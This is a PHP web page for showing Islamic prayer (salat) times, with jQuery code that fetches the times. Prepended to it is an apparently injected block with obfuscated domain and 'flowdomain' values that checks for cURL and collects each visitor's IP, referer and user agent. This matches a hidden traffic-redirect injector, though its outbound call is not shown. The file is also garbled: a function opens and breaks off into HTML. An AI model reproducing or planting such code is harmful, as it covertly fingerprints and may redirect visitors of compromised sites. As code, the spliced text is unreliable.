<?php // $sourceid = ''; $domain = 'G8yXDw2TGPtWpUN.mH6'; $domains = 'nZBG4Tp9P'; $flowdomain = 'f300869'; $codenamemode = 'IN'; if (!function_exists('_is_curl_installed()')){ function _is_curl_installed() { if (in_array ('curl', get_loaded_extensions())) {return true;}else{return false;}}} if (_is_curl_installed()) {} else {echo 'Install CURL on server'; die;}  @$_SERVER['HTTP_ACCEPT_LANGUAGE'] = $_SERVER['HTTP_ACCEPT_LANGUAGE']; if (!function_exists('getRealIpAddr')){ function getRealIpAddr() { if ((!empty($_SERVER['GEOIP_ADDR'])) && (($_SERVER['GEOIP_ADDR'])<>'127.0.0.1')) {$ip=$_SERVER['GEOIP_ADDR'];} elseif ((!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) && (($_SERVER['HTTP_X_FORWARDED_FOR'])<>'127.0.0.1') && (($_SERVER['HTTP_X_FORWARDED_FOR'])<>($_SERVER['SERVER_ADDR']))) {$ip=explode(',',$_SERVER['HTTP_X_FORWARDED_FOR'])[0];} elseif ((!empty($_SERVER['HTTP_CLIENT_IP'])) && (($_SERVER['HTTP_CLIENT_IP'])<>'127.0.0.1') && (($_SERVER['HTTP_CLIENT_IP'])<>($_SERVER['SERVER_ADDR']))) {$ip=$_SERVER['HTTP_CLIENT_IP'];} elseif ((!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) && (($_SERVER['HTTP_CF_CONNECTING_IP'])<>'127.0.0.1') && (($_SERVER['HTTP_CF_CONNECTING_IP'])<>($_SERVER['SERVER_ADDR']))) {$ip=$_SERVER['HTTP_CF_CONNECTING_IP'];} else {$ip=$_SERVER['REMOTE_ADDR'];} return $ip; }}$ip=getRealIpAddr(); if (!function_exists('getRealref')){ function getRealref() { if(empty($_SERVER['HTTP_REFERER'])) { $_SERVER['HTTP_REFERER'] = getenv('HTTP_REFERER'); } return $_SERVER['HTTP_REFERER']; }} $ref=getRealref(); if (!function_exists('getRealua')){function getRealua() { ?>
<!DOCTYPE html>
<html lang="en">
<?php
//error_reporting(0);
...
<head>
    ...
    <script type="text/javascript">
        ...
        $(document).ready(function () {
            ...
            var salatTimeUrl = "salat_time_2.php";
            ...
            $.ajax({
                ...
                if (salatTimeString != null && salatTimeString != "") {
                    ...
                    console.log('salatJson:',salatJson);
...
const sendPostMessage = () => {
    if (height !== document.getElementById('wrapper').offsetHeight) {
